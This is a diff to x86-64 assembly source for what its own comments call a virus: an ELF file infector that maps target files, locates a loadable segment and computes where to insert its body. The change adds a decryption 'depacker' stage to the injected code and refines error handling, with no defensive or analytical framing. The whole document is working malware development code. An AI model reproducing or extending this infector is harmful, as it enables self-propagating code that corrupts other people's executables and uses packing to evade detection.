@@ -5,6 +5,8 @@ section .text
 	extern _string
 	extern _ft_strlen
 	extern _thread_create
+	extern _decrypt
+	extern _end_decrypt
 
 _file_size:
 	enter 24, 0
@@ -126,7 +128,7 @@ _treat_file: ; void treat_file(char *name (rdi), long virus_size (rsi), char *fu
 	mov QWORD [rsp + 104], r10
 	cmp rax, 64
 	jl _close_file
-	
+
 ;;;;;;;;;;;;;;;;;
 ; mmap file
 	mov rax, 9
@@ -200,7 +202,7 @@ _loop_verif:
 	cmp r10d, 1 ; if r10 != 1
 	jne _inc_before_reloop
 ; we find pt_load, now we need to go to our supposed str addres:
-; str_addr = (segment offset in file + segment size in file) - virus size
+; str_addr = (segment offset in file + segment size in file) - virus size - depacker - key
 	mov r10, QWORD [rsp + 32] ; take phdr
 	add r10, 8 ; add 8 to phdr, offset for p_offset (offset of the segment in file)
 	mov r10, QWORD [r10] ; dereference it to take the value
@@ -211,6 +213,13 @@ _loop_verif:
 	add QWORD [rsp + 56], r10 ; add it to the p_offset find before
 	mov r10, QWORD [rsp + 8] ; take the virus size
 	sub QWORD [rsp + 56], r10 ; substract the virus size to our offset+size
+
+; take depacekr size
+	lea r10, [rel _decrypt]
+	lea r11, [rel _end_decrypt]
+	sub r11, r10
+	sub QWORD [rsp + 56], r11
+
 _cmp_offset:
 	cmp QWORD [rsp + 56], 0
 	jle _call_mmaped_update ; if our string addr is lower than the mmap addr, so we are out of the file, and this one cant hold our virus
@@ -252,8 +261,12 @@ _call_mmaped_update:
 		add QWORD [rsp], 8
 	call _update_mmaped_file
 		add rsp, QWORD [rsp]
-	lea rax, [rel _ok_end]
-	mov QWORD [rsp + 104], rax
+	lea rdi, [rel _ok_end]
+	mov QWORD [rsp + 104], rdi
+	cmp rax, 1
+	je _munmap
+	lea rdi, [rel _not_ok_end]
+	mov QWORD [rsp + 104], rdi
 
 ;;;;;;;;;;;;;;;;;;;;;;;;
 ; munmap
